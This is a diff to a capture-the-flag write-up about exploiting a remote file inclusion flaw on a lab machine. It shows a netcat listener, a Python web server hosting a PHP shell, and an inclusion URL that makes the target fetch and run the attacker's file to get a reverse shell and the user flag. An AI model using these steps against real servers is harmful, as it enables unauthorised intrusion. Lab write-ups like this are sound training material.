@@ -127,9 +127,10 @@ Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28
       		public $secure_login_value = "";
       		public $secure_login_redirect = "";
       	} 
-And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it rce.php (the code is provided in the file "rce.php" of this folder). Set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/rce.php`. There we go: <br />
+And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it shell.php (the code is provided in the file "shell.php" of this folder). Open a netcat listener `nc -lnvp 4444`, set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/shell.php`. There we go: <br />
 ![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
-The file was successfully uploaded.
+![image](https://github.com/user-attachments/assets/a363b8d5-dd59-46cc-9082-160316c68c6b)<br />
+And we have our user flag (the answers are all at the end of the writeup)
 
                                                             
 - What is Miles password for his emails?
